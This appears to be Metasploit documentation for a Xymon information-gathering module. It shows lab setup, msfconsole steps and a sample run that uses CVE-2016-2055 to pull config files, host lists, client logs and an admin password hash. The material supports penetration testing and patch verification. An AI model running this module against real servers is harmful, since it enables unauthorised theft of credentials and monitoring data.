## Description

  This module retrieves information from a Xymon daemon service
  (formerly Hobbit, based on Big Brother), including server
  configuration information, a list of monitored hosts, and
  associated client log for each host.

  This module also retrieves usernames and password hashes from
  the `xymonpasswd` config file from Xymon servers before 4.3.25,
  which permit download arbitrary config files (CVE-2016-2055),
  and servers configured with `ALLOWALLCONFIGFILES` enabled.


## Vulnerable Application

  [Xymon](http://xymon.sourceforge.net/) is a system for monitoring servers and networks.

  Xymon packages are available in software repositories for various Linux distributions :

  ```
  sudo apt-get install xymon
  ```

  Refer to http://xymon.sourceforge.net/xymon/help/install.html for more information.

  A Xymon virtual appliance is also available :

  * https://sourceforge.net/projects/xymon/files/Xymon/4.3.10/VM/

  To expose the `xymonpasswd` file, add the following line to `/etc/xymon/xymonserver.cfg` :

  ```
  ALLOWALLCONFIGFILES="TRUE"
  ```

  And restart the service with : `service xymon restart`.


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use use auxiliary/gather/xymon_info`
  3. Do: `set rhost [IP]`
  4. Do: `run`
  5. You should receive server and client host information


## Scenarios

  ```
  msf5 > use auxiliary/gather/xymon_info 
  msf5 auxiliary(gather/xymon_info) > set rhosts 172.16.191.250
  rhosts => 172.16.191.250
  msf5 auxiliary(gather/xymon_info) > run
  [*] Running module against 172.16.191.250

  [*] 172.16.191.250:1984 - Xymon daemon version 4.3.28
  [*] 172.16.191.250:1984 - Retrieving configuration files ...
  [+] 172.16.191.250:1984 - xymonserver.cfg (18347 bytes) stored in /root/.msf4/loot/20190629235042_default_172.16.191.250_xymon.config.xym_136371.txt
  [+] 172.16.191.250:1984 - hosts.cfg (745 bytes) stored in /root/.msf4/loot/20190629235042_default_172.16.191.250_xymon.config.hos_647070.txt
  [+] 172.16.191.250:1984 - xymonpasswd (44 bytes) stored in /root/.msf4/loot/20190629235042_default_172.16.191.250_xymon.config.xym_182226.txt
  [+] 172.16.191.250:1984 - Credentials: admin : $apr1$axRTeLB1$TFmoeLwRnus.Yhr5fJmc1.
  [*] 172.16.191.250:1984 - Retrieving host list ...
  [+] 172.16.191.250:1984 - Host info (127 bytes) stored in /root/.msf4/loot/20190629235042_default_172.16.191.250_xymon.hostinfo_254799.txt
  [+] 172.16.191.250:1984 - Found 3 hosts
  [*] 172.16.191.250:1984 - Retrieving client logs ...
  [+] 172.16.191.250:1984 - debian-9-6-0-x64-xfce.local client log (87942 bytes) stored in /root/.msf4/loot/20190629235042_default_172.16.191.250_xymon.hosts.debi_671716.txt
  [*] 172.16.191.250:1984 - test-host client log is empty
  [*] 172.16.191.250:1984 - another-test-host client log is empty
  [*] Auxiliary module execution completed
  msf5 auxiliary(gather/xymon_info) > creds
  Credentials
  ===========

  host            origin          service            public  private                                realm  private_type        JtR Format
  ----            ------          -------            ------  -------                                -----  ------------        ----------
  172.16.191.250  172.16.191.250  1984/tcp (xymond)  admin   $apr1$axRTeLB1$TFmoeLwRnus.Yhr5fJmc1.         Nonreplayable hash  md5crypt
  ```

